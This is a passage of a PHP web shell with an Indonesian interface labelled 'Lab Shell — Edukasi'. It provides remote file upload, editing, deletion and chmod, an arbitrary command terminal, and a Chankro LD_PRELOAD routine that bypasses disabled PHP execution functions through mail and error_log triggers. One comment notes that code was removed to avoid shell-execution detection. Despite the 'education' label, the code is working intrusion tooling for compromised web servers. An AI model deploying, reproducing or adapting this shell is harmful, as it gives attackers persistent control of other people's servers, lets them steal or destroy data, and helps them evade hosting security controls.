            'msg' => 'Tidak ada trigger function tersedia (mail, mb_send_mail, error_log, imap_mail semua diblokir).');
    }

    // Tunggu output (max 1.5 detik, cek tiap 100ms)
    $waited = 0; $out = '';
    while ($waited < 1500000) {
        if (@file_exists($outFile) && @filesize($outFile) > 0) break;
        @usleep(100000); $waited += 100000;
    }
    if (@file_exists($outFile)) {
        $tmp = @file_get_contents($outFile);
        $out = ($tmp !== false) ? $tmp : '';
        @unlink($outFile);
    }
    @unlink($soFile); @unlink($sockFile);

    return array('ok' => true, 'out' => $out, 'method' => $method, 'msg' => '');
}


// ── AJAX HANDLER ──────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=utf-8');
    $action = isset($_POST['action']) ? $_POST['action'] : '';

    // ── Upload file ──────────────────────────────────────────
    if (isset($_FILES['upl'])) {
        $dir = isset($_POST['dir']) ? $_POST['dir'] : getcwd();
        if (!is_dir($dir)) { echo json_encode(array('ok'=>false,'msg'=>'Direktori tidak valid')); exit; }
        $name = basename($_FILES['upl']['name']);
        $dest = rtrim($dir, '/\\') . DIRECTORY_SEPARATOR . $name;
        if (@move_uploaded_file($_FILES['upl']['tmp_name'], $dest)) {
            echo json_encode(array('ok'=>true,'msg'=>'Upload berhasil: '.$name));
        } else {
            echo json_encode(array('ok'=>false,'msg'=>'Gagal upload: '.$name));
        }
        exit;
    }

    // ── Download file ─────────────────────────────────────────
    if ($action === 'download') {
        $path = isset($_POST['path']) ? $_POST['path'] : '';
        if (!file_exists($path) || is_dir($path)) {
            echo json_encode(array('ok'=>false,'msg'=>'File tidak ditemukan'));
            exit;
        }
        // Return download URL via redirect flag
        echo json_encode(array('ok'=>true,'dl'=>true,'path'=>$path,'name'=>basename($path)));
        exit;
    }

    // ── List directory ────────────────────────────────────────
    if ($action === 'ls') {
        $dir = isset($_POST['dir']) ? $_POST['dir'] : getcwd();
        if (!is_dir($dir)) { echo json_encode(array('ok'=>false,'msg'=>'Bukan direktori')); exit; }
        $rp = realpath($dir);
        if (!$rp) $rp = $dir;
        $raw = @scandir($rp);
        if ($raw === false) { echo json_encode(array('ok'=>false,'msg'=>'Tidak dapat membaca direktori')); exit; }
        $entries = array();
    // Parent dir entry
        $pp = dirname($rp);
        if ($pp !== $rp) {
            $entries[] = array(
                'name'=>'..',
                'path'=>$pp,
                'type'=>'dir',
                'label'=>'UP',
                'size'=>'-',
                'perm'=>lshPermStr($pp),
                'octal'=>lshPermOct($pp),
                'writable'=>is_writable($pp),
            );
        }
        // Sort: dirs first, then files
        $dirs = array(); $files = array();
        foreach ($raw as $f) {
            if ($f === '.' || $f === '..') continue;
            $fp = $rp . DIRECTORY_SEPARATOR . $f;
            if (is_dir($fp)) $dirs[] = $f; else $files[] = $f;
        }
        sort($dirs); sort($files);
        foreach (array_merge($dirs, $files) as $f) {
            $fp = $rp . DIRECTORY_SEPARATOR . $f;
            $isDir = is_dir($fp);
            $sz = $isDir ? '-' : lshFormatBytes((int)@filesize($fp));
            $entries[] = array(
                'name'     => $f,
                'path'     => $fp,
                'type'     => $isDir ? 'dir' : 'file',
                'label'    => lshFileLabel($fp),
                'size'     => $sz,
                'perm'     => lshPermStr($fp),
                'octal'    => lshPermOct($fp),
                'writable' => is_writable($fp),
            );
        }
        echo json_encode(array('ok'=>true,'cwd'=>$rp,'entries'=>$entries));
        exit;
    }

    // ── Read file ─────────────────────────────────────────────
    if ($action === 'read') {
        $path = isset($_POST['path']) ? $_POST['path'] : '';
        if (!file_exists($path) || is_dir($path)) { echo json_encode(array('ok'=>false,'msg'=>'File tidak ada')); exit; }
        $content = @file_get_contents($path);
        if ($content === false) { echo json_encode(array('ok'=>false,'msg'=>'Tidak bisa membaca file')); exit; }
        echo json_encode(array('ok'=>true,'path'=>$path,'content'=>$content));
        exit;
    }

    // ── Save file ─────────────────────────────────────────────
    if ($action === 'save') {
        $path    = isset($_POST['path'])    ? $_POST['path']    : '';
        $content = isset($_POST['content']) ? $_POST['content'] : '';
        if (!$path) { echo json_encode(array('ok'=>false,'msg'=>'Path kosong')); exit; }
        $r = @file_put_contents($path, $content);
        if ($r === false) { echo json_encode(array('ok'=>false,'msg'=>'Gagal menyimpan')); exit; }
        echo json_encode(array('ok'=>true,'msg'=>'Tersimpan: '.basename($path)));
        exit;
    }

    // ── Create file/dir ───────────────────────────────────────
    if ($action === 'create') {
        $path = isset($_POST['path']) ? $_POST['path'] : '';
        $type = isset($_POST['type']) ? $_POST['type'] : 'file';
        if (!$path) { echo json_encode(array('ok'=>false,'msg'=>'Path kosong')); exit; }
        if ($type === 'dir') {
            if (@mkdir($path, 0755, true)) echo json_encode(array('ok'=>true,'msg'=>'Folder dibuat'));
            else echo json_encode(array('ok'=>false,'msg'=>'Gagal buat folder'));
        } else {
            if (@file_put_contents($path, '') !== false) echo json_encode(array('ok'=>true,'msg'=>'File dibuat'));
            else echo json_encode(array('ok'=>false,'msg'=>'Gagal buat file'));
        }
        exit;
    }

    // ── Rename ────────────────────────────────────────────────
    if ($action === 'rename') {
        $old = isset($_POST['old']) ? $_POST['old'] : '';
        $newName = isset($_POST['new']) ? $_POST['new'] : '';
        if (!$old || !$newName) { echo json_encode(array('ok'=>false,'msg'=>'Nama tidak valid')); exit; }
        $newPath = dirname($old) . DIRECTORY_SEPARATOR . basename($newName);
        if (@rename($old, $newPath)) echo json_encode(array('ok'=>true,'msg'=>'Berhasil rename'));
        else echo json_encode(array('ok'=>false,'msg'=>'Gagal rename'));
        exit;
    }

    // ── Chmod ─────────────────────────────────────────────────
    if ($action === 'chmod') {
        $path = isset($_POST['path']) ? $_POST['path'] : '';
        $perm = isset($_POST['perm']) ? $_POST['perm'] : '';
        if (!$path || !$perm) { echo json_encode(array('ok'=>false,'msg'=>'Parameter tidak lengkap')); exit; }
        $oct = octdec(ltrim($perm, '0'));
        if (@chmod($path, $oct)) echo json_encode(array('ok'=>true,'msg'=>'Permission berubah ke '.$perm));
        else echo json_encode(array('ok'=>false,'msg'=>'Gagal chmod'));
        exit;
    }

    // ── Delete ────────────────────────────────────────────────
    if ($action === 'delete') {
        $path = isset($_POST['path']) ? $_POST['path'] : '';
        if (!$path || !file_exists($path)) { echo json_encode(array('ok'=>false,'msg'=>'File/folder tidak ada')); exit; }
        lshDeleteRecursive($path);
        echo json_encode(array('ok'=>true,'msg'=>'Dihapus: '.basename($path)));
        exit;
    }

    // ── Bulk delete ───────────────────────────────────────────
    if ($action === 'bulk_delete') {
        $paths = isset($_POST['paths']) ? json_decode($_POST['paths'], true) : array();
        if (!is_array($paths) || empty($paths)) { echo json_encode(array('ok'=>false,'msg'=>'Tidak ada file dipilih')); exit; }
        $ok = 0; $fail = 0;
        foreach ($paths as $p) {
            if (file_exists($p)) { lshDeleteRecursive($p); $ok++; } else $fail++;
        }
        $msg = "$ok item dihapus" . ($fail > 0 ? ", $fail gagal" : '');
        echo json_encode(array('ok'=>true,'msg'=>$msg));
        exit;
    }

    // ── Bulk copy ─────────────────────────────────────────────
    if ($action === 'bulk_copy') {
        $paths = isset($_POST['paths']) ? json_decode($_POST['paths'], true) : array();
        $dest  = isset($_POST['dest'])  ? rtrim($_POST['dest'], '/\\') : '';
        if (!is_array($paths) || empty($paths) || !is_dir($dest)) { echo json_encode(array('ok'=>false,'msg'=>'Parameter tidak valid')); exit; }
        $ok = 0; $fail = 0;
        foreach ($paths as $p) {
            $target = $dest . DIRECTORY_SEPARATOR . basename($p);
            if (is_dir($p)) {
                if (lshCopyDir($p, $target)) $ok++; else $fail++;
            } elseif (file_exists($p)) {
                if (@copy($p, $target)) $ok++; else $fail++;
            } else $fail++;
        }
        echo json_encode(array('ok'=>true,'msg'=>"$ok item disalin, $fail gagal"));
        exit;
    }

    // ── Bulk move ─────────────────────────────────────────────
    if ($action === 'bulk_move') {
        $paths = isset($_POST['paths']) ? json_decode($_POST['paths'], true) : array();
        $dest  = isset($_POST['dest'])  ? rtrim($_POST['dest'], '/\\') : '';
        if (!is_array($paths) || empty($paths) || !is_dir($dest)) { echo json_encode(array('ok'=>false,'msg'=>'Parameter tidak valid')); exit; }
        $ok = 0; $fail = 0;
        foreach ($paths as $p) {
            $target = $dest . DIRECTORY_SEPARATOR . basename($p);
            if (@rename($p, $target)) $ok++; else $fail++;
        }
        echo json_encode(array('ok'=>true,'msg'=>"$ok item dipindah, $fail gagal"));
        exit;
    }

// --- Extract ZIP --------------------------------------------------------
if ($action === 'unzip') {
    $path = isset($_POST['path']) ? $_POST['path'] : '';
    if (!file_exists($path)) { echo json_encode(array('ok'=>false,'msg'=>'File tidak ada')); exit; }
    $dir = dirname($path);

    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($path) === true) {
            $zip->extractTo($dir);
            $zip->close();
            echo json_encode(array('ok'=>true,'msg'=>'Berhasil Diekstrak'));
        } else {
            echo json_encode(array('ok'=>false,'msg'=>'Gagal membuka file zip'));
        }
    } else {
        // Fallback dihapus. Menghindari deteksi eksekusi shell.
        echo json_encode(array('ok'=>false,'msg'=>'Ekstensi ZipArchive tidak aktif'));
    }
    exit;
}

// --- Extract TAR/GZ -----------------------------------------------------
if ($action === 'untargz') {
    $path = isset($_POST['path']) ? $_POST['path'] : '';
    if (!file_exists($path)) { echo json_encode(array('ok'=>false,'msg'=>'File tidak ada')); exit; }
    $dir = dirname($path);

    // Menggunakan PharData bawaan PHP, tidak membutuhkan exec() atau tar CLI
    if (class_exists('PharData')) {
        try {
            $phar = new PharData($path);
            // Parameter ketiga 'true' untuk menimpa file (overwrite) jika sudah ada
            $phar->extractTo($dir, null, true);
            echo json_encode(array('ok'=>true,'msg'=>'Berhasil Diekstrak'));
        } catch (Exception $e) {
            echo json_encode(array('ok'=>false,'msg'=>'Error ekstraksi: ' . $e->getMessage()));
        }
    } else {
        echo json_encode(array('ok'=>false,'msg'=>'Class PharData tidak aktif'));
    }
    exit;
}

    // ── Terminal ──────────────────────────────────────────────
    if ($action === 'terminal') {
        $cmd = isset($_POST['cmd']) ? trim($_POST['cmd']) : '';
        // Sync CWD dari session
        if (!isset($_SESSION['lsh_cwd']) || !is_dir($_SESSION['lsh_cwd'])) {
            $_SESSION['lsh_cwd'] = getcwd();
        }
        $termCwd = $_SESSION['lsh_cwd'];
        // Ganti CWD proses PHP ke CWD terminal
        @chdir($termCwd);

        if ($cmd === '') { echo json_encode(array('ok'=>true,'out'=>'','cwd'=>$termCwd)); exit; }

        // Handle perintah cd secara native
        if (preg_match('/^\s*cd\s*(.*)$/i', $cmd, $m)) {
            $target = trim($m[1]);
            if ($target === '' || $target === '~') {
                // cd tanpa arg: ke home atau root
                $home = getenv('HOME');
                if (!$home) $home = '/';
                $target = $home;
            } elseif ($target === '-') {
                $target = isset($_SESSION['lsh_cwd_prev']) ? $_SESSION['lsh_cwd_prev'] : $termCwd;
            } elseif ($target[0] !== '/') {
                // Path relatif
                $target = rtrim($termCwd, '/') . '/' . $target;
            }
            // Normalisasi path
            $resolved = realpath($target);
            if ($resolved === false) {
                // Coba tanpa realpath jika dir bisa diakses
                $resolved = $target;
            }
            if (is_dir($resolved)) {
                $_SESSION['lsh_cwd_prev'] = $termCwd;
                $_SESSION['lsh_cwd'] = $resolved;
                echo json_encode(array('ok'=>true,'out'=>'','cwd'=>$resolved));
            } else {
                echo json_encode(array('ok'=>true,'out'=>'bash: cd: '.$target.': No such file or directory','cwd'=>$termCwd));
            }
            exit;
        }

        // Handle perintah pwd secara native
        if (preg_match('/^\s*pwd\s*$/i', $cmd)) {
            echo json_encode(array('ok'=>true,'out'=>$termCwd,'cwd'=>$termCwd));
            exit;
        }

        // Jalankan command di dalam CWD yang benar
        $isWin = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
        if ($isWin) {
            $fullCmd = 'cd /d ' . escapeshellarg($termCwd) . ' && ' . $cmd;
        } else {
            $fullCmd = 'cd ' . escapeshellarg($termCwd) . ' && ' . $cmd;
        }
        $out = lshExecCmd($fullCmd);
        echo json_encode(array('ok'=>true,'out'=>$out,'cwd'=>$termCwd));
        exit;
    }

    // ── TerminalByp (Chankro LD_PRELOAD) ───────────────
    if ($action === 'byp_terminal') {
        $cmd = isset($_POST['cmd']) ? trim($_POST['cmd']) : '';
        $dir = isset($_POST['dir']) ? trim($_POST['dir']) : '';
        if (!$dir || !is_dir($dir)) {
            $dir = (isset($_SESSION['lsh_cwd']) && is_dir($_SESSION['lsh_cwd']))
                 ? $_SESSION['lsh_cwd'] : getcwd();
        }
        if ($cmd === '') {
            echo json_encode(array('ok' => true, 'out' => '', 'method' => 'none', 'msg' => '', 'dir' => $dir));
            exit;
        }
// Handle cd secara native (Chankro tidak bisa persistent cd)
if (preg_match('/^\s*cd\s*(.*)?$/i', $cmd, $m)) {
    $target = trim($m[1]);
    if ($target === '' || $target === '~') {
        $target = getenv('HOME') ?: '/';
    } elseif ($target === '-') {
        $target = isset($_SESSION['lsh_byp_cwd_prev']) ? $_SESSION['lsh_byp_cwd_prev'] : $dir;
    } elseif ($target[0] !== '/') {
        $target = rtrim($dir, '/') . '/' . $target;
    }
    $resolved = realpath($target) ?: $target;
    if (is_dir($resolved)) {
        $_SESSION['lsh_byp_cwd_prev'] = $dir;
        $dir = $resolved;
        $_SESSION['lsh_cwd'] = $resolved; // sync dengan session
    }
    echo json_encode(array('ok' => true, 'out' => '', 'method' => 'cd', 'msg' => '', 'dir' => $dir));
    exit;
}
// Handle pwd secara native
if (preg_match('/^\s*pwd\s*$/i', $cmd)) {
    echo json_encode(array('ok' => true, 'out' => $dir, 'method' => 'pwd', 'msg' => '', 'dir' => $dir));
    exit;
}
        $res = runChankroByp($cmd, $dir);
        $res['dir'] = $dir;
        echo json_encode($res);
        exit;
    }

    // ── TerminalByp Test (cek environment) ────────────────────
    if ($action === 'byp_test') {
        $avail = array();
        if (function_exists('mail'))         $avail[] = 'mail';
        if (function_exists('mb_send_mail')) $avail[] = 'mb_send_mail';
        if (function_exists('error_log'))    $avail[] = 'error_log';
        if (function_exists('imap_mail'))    $avail[] = 'imap_mail';
        $hookOk  = true; // ELF hook sudah hardcoded di dalam file ini
        $isWin2  = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
        $disabledFns = ini_get('disable_functions');
        echo json_encode(array(
            'ok'         => true,
            'avail'      => $avail,
            'hook_ok'    => $hookOk,
            'os_ok'      => !$isWin2,
            'php_ver'    => PHP_VERSION,
            'disable_fn' => $disabledFns ? $disabledFns : 'tidak ada',
            'ld_note'    => !$isWin2
                ? 'Linux/Unix \u2014 LD_PRELOAD didukung'
                : 'Windows \u2014 LD_PRELOAD tidak didukung',
        ));
        exit;
    }

    // ── Sysinfo ───────────────────────────────────────────────
    if ($action === 'sysinfo') {
        $data = lshGetSysInfo();
        echo json_encode(array('ok'=>true,'data'=>$data));
        exit;
    }

    echo json_encode(array('ok'=>false,'msg'=>'Action tidak dikenal: '.$action));
    exit;
}

// ── HANDLE DIRECT DOWNLOAD (GET) ──────────────────────────────
if (isset($_GET['dl']) && !empty($_GET['dl'])) {
    $path = isset($_GET['dl']) ? $_GET['dl'] : '';
    if (empty($_SESSION[SESSION_KEY])) { http_response_code(403); echo 'Unauthorized'; exit; }
    if (!file_exists($path) || is_dir($path)) { http_response_code(404); echo 'File not found'; exit; }
    $name = basename($path);
    $mime = function_exists('mime_content_type') ? mime_content_type($path) : 'application/octet-stream';
    header('Content-Type: ' . $mime);
    header('Content-Disposition: attachment; filename="' . addslashes($name) . '"');
    header('Content-Length: ' . filesize($path));
    header('Cache-Control: no-cache, must-revalidate');
    @readfile($path);
    exit;
}

// ── RENDER MAIN UI ────────────────────────────────────────────
$cwd = getcwd();
$ip  = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname(gethostname());
// Init terminal CWD
if (!isset($_SESSION['lsh_cwd']) || !is_dir($_SESSION['lsh_cwd'])) {
    $_SESSION['lsh_cwd'] = $cwd;
}
$termCwd = $_SESSION['lsh_cwd'];

// Detect current user
$currentUser = 'unknown';
if (function_exists('posix_getuid') && function_exists('posix_getpwuid')) {
    $pw = @posix_getpwuid(posix_getuid());
    $currentUser = isset($pw['name']) ? $pw['name'] : 'uid:'.posix_getuid();
} elseif (function_exists('get_current_user')) {
    $currentUser = get_current_user();
}
$isRoot = ($currentUser === 'root' || (function_exists('posix_getuid') && posix_getuid() === 0));
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Lab Shell — Edukasi</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,600;0,700;1,400&family=Inter:wght@400;500;600;700&display=swap">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0a0b12;--s1:#111219;--s2:#181924;--s3:#1f2030;
  --bd:#252638;--acc:#7c3aed;--acc2:#06b6d4;--acc3:#a855f7;
  --g:#10b981;--r:#ef4444;--y:#f59e0b;--o:#f97316;
  --t1:#e2e8f0;--t2:#94a3b8;--t3:#475569;
  --ff:'JetBrains Mono',monospace;--fs:'Inter',sans-serif;
}
*{scrollbar-width:thin;scrollbar-color:var(--bd) transparent}
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-thumb{background:var(--bd);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:var(--acc)}
html,body{height:100%;background:var(--bg);color:var(--t1);font-family:var(--fs);font-size:14px;overflow:hidden}
button{cursor:pointer;font-family:var(--fs)}
input,textarea{font-family:var(--ff);background:var(--s3);color:var(--t1);border:1px solid var(--bd);border-radius:6px;outline:none;padding:6px 10px;transition:border-color .2s}
input:focus,textarea:focus{border-color:var(--acc)}

/* LAYOUT */
#app{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column;height:100vh}

/* TOPBAR */
#topbar{
  display:-webkit-box;display:-ms-flexbox;display:flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;
  gap:10px;-ms-flex-wrap:wrap;flex-wrap:wrap;
  padding:8px 18px;background:var(--s1);border-bottom:1px solid var(--bd);
  -ms-flex-negative:0;flex-shrink:0;position:relative;z-index:5;
}
#topbar::after{
  content:'';position:absolute;bottom:0;left:0;right:0;height:1px;
  background:-webkit-linear-gradient(left,transparent,var(--acc),var(--acc2),transparent);
  background:linear-gradient(90deg,transparent,var(--acc),var(--acc2),transparent);
}
.logo{
  font-family:var(--ff);font-weight:700;font-size:15px;letter-spacing:3px;
  background:-webkit-linear-gradient(135deg,var(--acc) 0%,var(--acc2) 100%);
  background:linear-gradient(135deg,var(--acc) 0%,var(--acc2) 100%);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
}
.badge{
  display:-webkit-inline-box;display:-ms-inline-flexbox;display:inline-flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;gap:5px;
  padding:3px 12px;border-radius:20px;font-size:11px;font-weight:700;
  font-family:var(--ff);letter-spacing:.5px;
}
.b-root{background:rgba(239,68,68,.12);color:var(--r);border:1px solid rgba(239,68,68,.35)}
.b-user{background:rgba(16,185,129,.12);color:var(--g);border:1px solid rgba(16,185,129,.35)}
.chip{font-size:11px;font-family:var(--ff);color:var(--t3);display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;gap:4px}
.chip b{color:var(--t2)}
.tabs{display:-webkit-box;display:-ms-flexbox;display:flex;gap:4px;margin-left:auto}
.tab{
  padding:6px 18px;border-radius:7px;font-size:12px;font-weight:600;
  background:transparent;border:1px solid transparent;color:var(--t3);transition:all .2s;
}
.tab:hover{background:var(--s2);color:var(--t1);border-color:var(--bd)}
.tab.on{
  background:-webkit-linear-gradient(135deg,rgba(124,58,237,.8),rgba(91,33,182,.8));
  background:linear-gradient(135deg,rgba(124,58,237,.8),rgba(91,33,182,.8));
  color:#fff;border-color:rgba(124,58,237,.5);
  -webkit-box-shadow:0 0 14px rgba(124,58,237,.35);box-shadow:0 0 14px rgba(124,58,237,.35);
}
/* logout-btn removed */

/* MAIN */
#main{-webkit-box-flex:1;-ms-flex:1;flex:1;overflow:hidden;position:relative}
.panel{position:absolute;inset:0;display:none;-webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column}
.panel.on{display:-webkit-box;display:-ms-flexbox;display:flex}

/* ────── FILE MANAGER ────── */
/* Breadcrumb */
#fm-breadcrumb{
  display:-webkit-box;display:-ms-flexbox;display:flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;
  -ms-flex-wrap:wrap;flex-wrap:wrap;
  gap:2px;padding:5px 14px 5px;
  background:var(--s2);border-bottom:1px solid var(--bd);
  font-family:var(--ff);font-size:11px;-ms-flex-negative:0;flex-shrink:0;
}
.bc-seg{
  color:var(--acc2);cursor:pointer;padding:2px 5px;border-radius:4px;
  transition:background .15s,color .15s;
  white-space:nowrap;
}
.bc-seg:hover{background:rgba(6,182,212,.12);color:#fff}
.bc-sep{color:var(--t3);padding:0 1px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
.bc-root{color:var(--y)}
#fm-bar{
  display:-webkit-box;display:-ms-flexbox;display:flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;
  gap:6px;padding:8px 14px;
  background:var(--s1);border-bottom:1px solid var(--bd);-ms-flex-negative:0;flex-shrink:0;
}
#fm-path-in{
  -webkit-box-flex:1;-ms-flex:1;flex:1;font-size:12px;background:var(--s3);border:1px solid var(--bd);
  border-radius:6px;padding:5px 10px;color:var(--acc2);
}
.fbtn{
  display:-webkit-inline-box;display:-ms-inline-flexbox;display:inline-flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;gap:4px;
  padding:5px 11px;border-radius:6px;font-size:11px;font-weight:600;
  background:var(--s3);border:1px solid var(--bd);color:var(--t2);transition:all .15s;
}
.fbtn:hover{background:var(--s2);border-color:var(--acc);color:var(--acc)}

#tbl-wrap{-webkit-box-flex:1;-ms-flex:1;flex:1;overflow:auto}
#tbl{width:100%;border-collapse:collapse;font-family:var(--ff);font-size:12px}
#tbl thead th{
  text-align:left;padding:9px 12px;color:var(--t3);font-size:10px;
  font-weight:700;letter-spacing:.8px;text-transform:uppercase;
  border-bottom:1px solid var(--bd);position:-webkit-sticky;position:sticky;top:0;
  background:var(--bg);z-index:1;
}
#tbl tbody tr{border-bottom:1px solid rgba(37,38,56,.5);transition:background .1s}
#tbl tbody tr:hover{background:var(--s2)}
#tbl tbody tr.sel-row{background:rgba(124,58,237,.1)!important}
#tbl td{padding:7px 12px;vertical-align:middle}
.cb-cell{width:32px;padding:6px 8px!important}
.fm-cb{width:14px;height:14px;cursor:pointer;accent-color:var(--acc)}

/* Bulk bar */
#bulk-bar{
  display:none;-webkit-box-align:center;-ms-flex-align:center;align-items:center;
  gap:8px;padding:7px 14px;
  background:rgba(124,58,237,.08);border-top:1px solid rgba(124,58,237,.25);-ms-flex-negative:0;flex-shrink:0;
  font-size:12px;font-family:var(--ff);
}
#bulk-bar.on{display:-webkit-box;display:-ms-flexbox;display:flex}
#bulk-count{color:var(--acc2);font-weight:700;min-width:80px}
.bbtn{
  display:-webkit-inline-box;display:-ms-inline-flexbox;display:inline-flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;
  gap:5px;padding:5px 13px;border-radius:6px;font-size:11px;font-weight:600;
  background:var(--s3);border:1px solid var(--bd);color:var(--t2);cursor:pointer;transition:all .15s;
}
.bbtn:hover{background:var(--s2);border-color:var(--acc);color:var(--acc)}
.bbtn.del:hover{border-color:var(--r);color:var(--r)}
.bbtn-sep{width:1px;height:18px;background:var(--bd);-ms-flex-negative:0;flex-shrink:0}

/* Clipboard bar */
#clip-bar{
  display:none;-webkit-box-align:center;-ms-flex-align:center;align-items:center;
  gap:8px;padding:6px 14px;
  background:rgba(6,182,212,.07);border-bottom:1px solid rgba(6,182,212,.2);
  font-size:11px;font-family:var(--ff);-ms-flex-negative:0;flex-shrink:0;
}
#clip-bar.on{display:-webkit-box;display:-ms-flexbox;display:flex}
#clip-info{color:var(--acc2);-webkit-box-flex:1;-ms-flex:1;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.clip-op-badge{padding:2px 10px;border-radius:10px;font-size:10px;font-weight:700;letter-spacing:.5px}
.clip-op-copy{background:rgba(16,185,129,.12);color:var(--g);border:1px solid rgba(16,185,129,.3)}
.clip-op-move{background:rgba(245,158,11,.12);color:var(--y);border:1px solid rgba(245,158,11,.3)}
.paste-btn{
  display:-webkit-inline-box;display:-ms-inline-flexbox;display:inline-flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;
  gap:5px;padding:5px 16px;border-radius:6px;font-size:12px;font-weight:700;
  background:-webkit-linear-gradient(135deg,rgba(6,182,212,.25),rgba(124,58,237,.25));
  background:linear-gradient(135deg,rgba(6,182,212,.25),rgba(124,58,237,.25));
  border:1px solid rgba(6,182,212,.4);color:var(--acc2);cursor:pointer;transition:all .2s;
}
.paste-btn:hover{border-color:var(--acc2);-webkit-box-shadow:0 0 14px rgba(6,182,212,.3);box-shadow:0 0 14px rgba(6,182,212,.3)}
.clip-cancel{
  padding:4px 12px;border-radius:6px;font-size:11px;font-weight:600;
  background:var(--s3);border:1px solid var(--bd);color:var(--t3);cursor:pointer;transition:all .15s;
}
.clip-cancel:hover{border-color:var(--r);color:var(--r)}

/* Row button */
.rb.ext{border-color:rgba(16,185,129,.3);color:var(--g)}
.rb.ext:hover{border-color:var(--g);color:var(--g);background:rgba(16,185,129,.08)}
.rb.dl{border-color:rgba(6,182,212,.3);color:var(--acc2)}
.rb.dl:hover{border-color:var(--acc2);color:var(--acc2);background:rgba(6,182,212,.08)}

.lbl{
  display:-webkit-inline-box;display:-ms-inline-flexbox;display:inline-flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;
  -webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;
  min-width:36px;height:19px;border-radius:3px;
  font-size:9px;font-weight:700;letter-spacing:.5px;padding:0 4px;
}
.l-DIR{background:rgba(249,115,22,.15);color:var(--o);border:1px solid rgba(249,115,22,.3)}
.l-UP{background:rgba(71,85,105,.15);color:var(--t3);border:1px solid var(--bd)}
.l-PHP{background:rgba(124,58,237,.18);color:#c4b5fd;border:1px solid rgba(124,58,237,.3)}
.l-HTML{background:rgba(239,68,68,.12);color:#fca5a5;border:1px solid rgba(239,68,68,.25)}
.l-JS{background:rgba(245,158,11,.12);color:var(--y);border:1px solid rgba(245,158,11,.25)}
.l-CSS{background:rgba(6,182,212,.12);color:var(--acc2);border:1px solid rgba(6,182,212,.25)}
.l-ZIP{background:rgba(16,185,129,.12);color:var(--g);border:1px solid rgba(16,185,129,.25)}
.l-IMG{background:rgba(236,72,153,.12);color:#f9a8d4;border:1px solid rgba(236,72,153,.25)}
.l-TXT,.l-JSON,.l-FILE,.l-PDF,.l-SH,.l-UNKNOWN{background:rgba(71,85,105,.1);color:var(--t2);border:1px solid var(--bd)}

.fn{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-align:center;-ms-flex-align:center;align-items:center;gap:8px;cursor:pointer}
.fn:hover .fn-t{color:var(--acc2)}
.fn-t{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:200px}
.pok{color:var(--g)} .pro{color:var(--y)} .pno{color:var(--r)}
.acts{display:-webkit-box;display:-ms-flexbox;display:flex;gap:4px;-ms-flex-wrap:wrap;flex-wrap:wrap}
.rb{
  padding:2px 8px;border-radius:4px;font-size:10px;
  background:var(--s3);border:1px solid var(--bd);color:var(--t3);cursor:pointer;transition:all .15s;
}
.rb:hover{background:var(--s2);border-color:var(--acc);color:var(--acc)}
.rb.del:hover{border-color:var(--r);color:var(--r)}

#up-bar{
  display:-webkit-box;display:-ms-flexbox;display:flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;
  gap:8px;padding:6px 14px;
  background:var(--s2);border-top:1px solid var(--bd);-ms-flex-negative:0;flex-shrink:0;
}
#up-bar input[type=file]{font-size:11px;border:none;background:transparent;padding:2px;color:var(--t2)}
#up-msg{font-size:11px;font-family:var(--ff);transition:opacity .4s}
.mok{color:var(--g)}.merr{color:var(--r)}

/* ────── EDITOR ────── */
#ed-wrap{
  position:absolute;inset:0;background:rgba(0,0,0,.75);
  display:none;-webkit-box-align:center;-ms-flex-align:center;align-items:center;
  -webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;z-index:10;
}
#ed-wrap.on{display:-webkit-box;display:-ms-flexbox;display:flex}
#ed-box{
  width:83%;height:83vh;background:var(--s1);
  border:1px solid var(--bd);border-radius:12px;
  display:-webkit-box;display:-ms-flexbox;display:flex;
  -webkit-box-orient:vertical;-webkit-box-direction:normal;-ms-flex-direction:column;flex-direction:column;
  overflow:hidden;-webkit-box-shadow:0 25px 60px rgba(0,0,0,.55);box-shadow:0 25px 60px rgba(0,0,0,.55);
}
#ed-head{
  display:-webkit-box;display:-ms-flexbox;display:flex;
  -webkit-box-align:center;-ms-flex-align:center;align-items:center;
  padding:10px 16px;background:var(--s2);border-bottom:1px solid var(--bd);gap:8px;-ms-flex-negative:0;flex-shrink:0;
}
#ed-fn{-webkit-box-flex:1;-ms-flex:1;flex:1;font-family:var(--ff);font-size:12px;color:var(--acc2);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
